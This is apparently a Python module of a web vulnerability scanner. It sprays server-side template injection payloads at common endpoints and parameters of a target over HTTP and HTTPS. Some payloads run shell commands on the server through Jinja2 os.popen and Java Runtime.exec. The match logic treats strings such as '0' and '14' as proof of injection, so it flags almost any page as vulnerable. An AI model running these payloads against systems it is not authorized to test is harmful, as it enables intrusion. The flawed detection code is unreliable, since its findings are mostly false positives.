import os
import requests
from urllib.parse import urljoin, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from r_ascan.config import HTTP_HEADERS, DEFAULT_TIMEOUT
from r_ascan.module.other import Other

class SSTIScanner:
    SSTI_PAYLOADS = [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${{7*7}}", "{{7+7}}",
        "{{7-7}}", "{{7/1}}", "{{1337*0}}", "{{ [].__class__.__mro__[1].__subclasses__() }}",
        "{{ ''.__class__.__mro__[2].__subclasses__() }}", "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "{{ self.__init__.__globals__.os.popen('id').read() }}",
        "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        "{% print(7*7) %}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#set($x=7*7)$x", "{{ config.items() }}", "{{ request['application'].__globals__['os'].popen('id').read() }}",
        "<%= Runtime.getRuntime().exec('id') %>", "${@print(7*7)}"
    ]

    COMMON_PARAMS = [
        "name", "user", "q", "search", "lang", "query", "page", "input",
        "message", "title", "desc", "text", "keyword", "comment", "data"
    ]

    COMMON_ENDPOINTS = [
        "/", "/search", "/view", "/page", "/profile", "/comment", "/feedback", "/api", "/form"
    ]

    STRICT_INDICATORS = ["49", "14", "0", "1337"]

    def __init__(self, args):
        self.target = f"{args.target}:{args.port}" if args.port else args.target
        self.threads = args.threads
        self.verbose = args.verbose
        self.session = requests.Session()
        self.session.headers.update(HTTP_HEADERS)
        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
        self.printer = Other()

    def print_status(self, level, status, url, extra=""):
        colored_module = self.printer.color_text(self.module_name, "cyan")
        colored_url = self.printer.color_text(url, "yellow")
        status_colored = self.printer.color_text(f"{status}", "green" if status == "Vuln" else "red")
        print(f"[{level}] [Module: {colored_module}] [{status_colored}] {colored_url} {extra}")

    def scan(self):
        results = []
        tasks = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for scheme in ["http", "https"]:
                base = f"{scheme}://{self.target}".rstrip("/")
                for endpoint in self.COMMON_ENDPOINTS:
                    url = urljoin(base, endpoint)
                    for param in self.COMMON_PARAMS:
                        for payload in self.SSTI_PAYLOADS:
                            for method in ["GET", "POST"]:
                                tasks.append(executor.submit(
                                    self._send_request, method, url, endpoint, param, payload
                                ))

            for future in as_completed(tasks):
                res = future.result()
                if res:
                    results.append(res)
                    self.print_status("+", "Vuln", res['url'], f"param={res['param']} payload={res['payload']}")
                    return {"vulnerable": True, "details": results}

        self.print_status("*", "Not Vuln", self.target)
        return {"vulnerable": False, "details": []}

    def _send_request(self, method, url, endpoint, param, payload):
        data = {param: payload}
        try:
            if method == "GET":
                full_url = f"{url}?{urlencode(data)}"
                r = self.session.get(full_url, timeout=DEFAULT_TIMEOUT, verify=False)
            else:
                r = self.session.post(url, data=data, timeout=DEFAULT_TIMEOUT, verify=False)
                full_url = url

            matched = self._match_output(payload, r.text)
            if matched:
                if payload not in r.text or r.text.count(matched) > 1:
                    return {
                        "url": full_url,
                        "endpoint": endpoint,
                        "method": method,
                        "param": param,
                        "payload": payload,
                        "match": matched,
                        "status": r.status_code
                    }
                elif self.verbose:
                    self.print_status("-", "Not Vuln", full_url, "(input reflected only)")
            elif self.verbose:
                self.print_status("-", "Not Vuln", full_url)

        except Exception as e:
            if self.verbose:
                colored_module = self.printer.color_text(self.module_name, "cyan")
                colored_url = self.printer.color_text(url, "yellow")
                colored_error = self.printer.color_text(str(e), "red")
                print(f"[!] [Module: {colored_module}] [Error] {colored_url} - {colored_error}")
        return None

    def _match_output(self, payload, response_text):
        for val in self.STRICT_INDICATORS:
            if val in response_text:
                return val
        return None

def scan(args=None):
    return SSTIScanner(args).scan()
